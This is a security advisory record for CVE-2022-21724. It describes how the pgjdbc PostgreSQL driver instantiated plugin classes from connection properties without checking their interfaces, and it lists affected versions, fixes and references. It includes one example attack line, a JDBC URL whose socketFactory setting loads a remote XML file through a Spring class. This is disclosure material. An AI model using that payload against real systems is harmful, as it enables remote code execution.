advisory_id: GHSA-v7wg-cpwc-24m4
datasource_id: github_osv_importer_v2/GHSA-v7wg-cpwc-24m4
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/02/GHSA-v7wg-cpwc-24m4/GHSA-v7wg-cpwc-24m4.json
aliases:
  - CVE-2022-21724
summary: |
  pgjdbc Does Not Check Class Instantiation when providing Plugin Classes
  ### Impact

  pgjdbc instantiates plugin instances based on class names provided via `authenticationPluginClassName`, `sslhostnameverifier`, `socketFactory`, `sslfactory`, `sslpasswordcallback` connection properties.

  However, the driver did not verify if the class implements the expected interface before instantiating the class.

  Here's an example attack using an out-of-the-box class from Spring Framework:

  ```
  DriverManager.getConnection("jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml");
  ```

  The first impacted version is REL9.4.1208 (it introduced `socketFactory` connection property)
impacted_packages:
  - purl: pkg:maven/org.postgresql/postgresql
    affected_versions: vers:maven/>=9.4.1208|<42.2.25
    fixed_versions: vers:maven/42.2.25
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.postgresql/postgresql
    affected_versions: vers:maven/>=42.3.0|<42.3.2
    fixed_versions: vers:maven/42.3.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.0'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/02/GHSA-v7wg-cpwc-24m4/GHSA-v7wg-cpwc-24m4.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-668
  - CWE-665
  - CWE-74
references:
  - url: https://github.com/pgjdbc/pgjdbc
    reference_type:
    reference_id:
  - url: https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c813
    reference_type:
    reference_id:
  - url: https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-v7wg-cpwc-24m4
    reference_type:
    reference_id:
  - url: https://lists.debian.org/debian-lts-announce/2022/05/msg00027.html
    reference_type:
    reference_id:
  - url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BVEO7BEFXPBVHSPYL3YKQWZI6DYXQLFS
    reference_type:
    reference_id:
  - url: https://security.netapp.com/advisory/ntap-20220311-0005
    reference_type:
    reference_id:
  - url: https://www.debian.org/security/2022/dsa-5196
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-21724
    reference_type:
    reference_id: CVE-2022-21724
